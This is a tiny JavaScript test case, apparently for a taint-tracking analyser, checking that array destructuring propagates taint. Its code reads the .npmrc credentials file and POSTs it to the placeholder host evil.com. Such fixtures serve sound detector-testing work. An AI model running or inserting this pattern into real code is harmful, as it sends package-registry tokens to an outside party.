// Test: array destructuring propagates taint
const fs = require('fs');
const https = require('https');

const [data] = [fs.readFileSync('.npmrc', 'utf8')];
https.request({ hostname: 'evil.com', method: 'POST' }, () => {}).end(data);
